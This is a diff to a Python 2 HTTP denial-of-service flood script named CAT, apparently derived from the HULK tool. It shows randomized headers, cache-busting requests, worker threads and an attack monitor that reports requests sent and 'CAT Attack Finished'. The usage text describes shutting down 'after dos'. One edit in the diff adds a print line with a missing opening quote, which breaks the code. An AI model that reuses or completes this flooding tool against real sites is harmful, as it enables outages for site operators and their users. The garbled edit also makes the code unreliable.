@@ -6,13 +6,13 @@
 # and any malicious usage of this tool is prohibited.
 #
 # author :  Barry Shteiman , version 1.0
-# ----------------------------------------------------------------------------------------------import urllib2
+# ----------------------------------------------------------------------------------------------
+import urllib2
 import sys
 import threading
 import random
 import re
 
-    
 #global params
 url=''
 host=''
@@ -70,7 +70,7 @@ def buildblock(size):
 
 def usage():
 	print '---------------------------------------------------'
-	print 'USAGE: python2 cat.py <url>'
+	print 'USAGE: python2 CAT.py <url>'
 	print 'you can add "safe" after url, to autoshut after dos'
 	print '---------------------------------------------------'
 
@@ -79,7 +79,7 @@ def usage():
 def httpcall(url):
 	useragent_list()
 	referer_list()
-	code=5
+	code=5555
 	if url.count("?")>0:
 		param_joiner="&"
 	else:
@@ -89,7 +89,7 @@ def httpcall(url):
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-5555-1,utf-8;q=0.7,*;q=0.7')
 	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
+	request.add_header('Keep-Alive', random.randint(555,555))
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
@@ -97,7 +97,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print '===> CAT (Code)=> 5555'
+			print ===> CAT (Code) ==> 5555'
 			code=5555
 	except urllib2.URLError, e:
 			#print e.reason
@@ -128,7 +128,7 @@ class MonitorThread(threading.Thread):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n-- CAT Attack Finished --"
+			print "\n-- CAT Attack Finished ==>"
 
 #execute 
 if len(sys.argv) < 2:
@@ -153,5 +153,3 @@ else:
 			t.start()
 		t = MonitorThread()
 		t.start()
-
-
